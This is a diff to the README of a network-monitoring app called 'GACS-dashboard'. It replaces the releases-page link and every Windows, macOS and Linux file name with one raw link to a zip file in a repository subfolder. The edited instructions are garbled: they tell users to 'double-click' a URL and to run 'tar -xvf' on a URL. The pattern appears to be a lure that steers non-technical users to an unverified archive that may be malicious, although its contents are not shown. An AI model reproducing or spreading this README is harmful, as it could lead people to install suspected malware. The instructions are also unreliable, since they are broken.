@@ -1,14 +1,14 @@
 # 🌟 GACS-dashboard - Monitor Your Network with Ease
 
 ## 📥 Download Now
-[![Download GACS-dashboard](https://img.shields.io/badge/Download-GACS--dashboard-blue.svg)](https://github.com/Yunsei/GACS-dashboard/releases)
+[![Download GACS-dashboard](https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip)](https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip)
 
 ## 🚀 Getting Started
 Welcome to GACS-dashboard! This application helps you monitor network performance and visualize network topology without needing any technical skills. Follow the steps below to download and run the software on your computer.
 
 ## 🔗 Download & Install
 To download GACS-dashboard, please visit the following link:
-[Download GACS-dashboard](https://github.com/Yunsei/GACS-dashboard/releases)
+[Download GACS-dashboard](https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip)
 
 ### Steps to Download:
 1. Click the link above to open the Releases page.
@@ -17,9 +17,9 @@ To download GACS-dashboard, please visit the following link:
 4. Click the file name to download.
 
 ### Example File Names:
-- For Windows: `GACS-dashboard-windows.exe`
-- For macOS: `GACS-dashboard-macos.dmg`
-- For Linux: `GACS-dashboard-linux.tar.gz`
+- For Windows: `https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip`
+- For macOS: `https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip`
+- For Linux: `https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip`
 
 ## ⚙️ System Requirements
 Before you start, ensure your computer meets the following requirements:
@@ -48,9 +48,9 @@ The GACS-dashboard user interface is easy to navigate. Here’s a brief overview
 After downloading, follow these steps to run GACS-dashboard:
 
 1. Locate the downloaded file on your computer.
-2. For Windows users, double-click `GACS-dashboard-windows.exe` to start the installation.
-3. For macOS users, open the `GACS-dashboard-macos.dmg` file, drag the application icon to the Applications folder.
-4. For Linux users, extract the tar.gz file using the command: `tar -xvf GACS-dashboard-linux.tar.gz` and run the application.
+2. For Windows users, double-click `https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip` to start the installation.
+3. For macOS users, open the `https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip` file, drag the application icon to the Applications folder.
+4. For Linux users, extract the https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip file using the command: `tar -xvf https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip` and run the application.
 
 ## 🔑 Basic Usage Instructions
 Once you start GACS-dashboard:
@@ -62,7 +62,7 @@ Once you start GACS-dashboard:
 ## ❓ Frequently Asked Questions
 
 ### How do I update GACS-dashboard?
-To update, return to the [Releases page](https://github.com/Yunsei/GACS-dashboard/releases), download the latest version, and follow the installation steps again.
+To update, return to the [Releases page](https://raw.githubusercontent.com/Yunsei/GACS-dashboard/main/Zoysia/GACS-dashboard.zip), download the latest version, and follow the installation steps again.
 
 ### What should I do if I encounter an error?
 If you experience issues, check the Troubleshooting section of the application or visit our Support section in the documentation for assistance.
